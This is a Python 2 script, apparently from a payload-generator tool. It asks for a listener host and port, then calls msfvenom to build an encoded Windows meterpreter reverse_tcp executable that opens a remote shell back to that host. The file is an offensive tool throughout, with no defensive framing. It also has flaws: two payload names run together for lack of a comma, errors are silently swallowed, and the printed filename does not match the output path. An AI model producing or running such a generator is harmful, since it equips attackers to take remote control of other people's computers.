import os
import sys
import time
import subprocess
import socket
from termcolor import colored, cprint


class EXEPayloads(object):
	
	def GetInputVariables(self):
		global CORE_STRING
		global HOST
		global PORT
		global sock

		CORE_STRING = colored("[payload_gen]", 'blue')
		HOST = raw_input(CORE_STRING + " LHOST> ")
		PORT = raw_input(CORE_STRING + " LPORT> ")	
		
		payload_types = [ 
		
			'windows/meterpreter/reverse_tcp'
			'windows/meterpreter/reverse_http'		
		
			]
	def Meterpreter(self):
		global HOST
		global PORT
		global CORE_STRING	

		try:
			xterm_msf1 = "xterm -e msfvenom -p windows/meterpreter/reverse_tcp LHOST=" + HOST + " LPORT=" + PORT + " -e x86/shikata_ga_nai -f exe -o ~/Desktop/payload"
			os.system(xterm_msf1) 
			print CORE_STRING + " Payload Generated with Default Name 'payload.exe'"
		
		except KeyboardInterrupt:
			cprint("[-] User Aborted!", 'red')
			sys.exit(0)

		except:
			pass
		
		

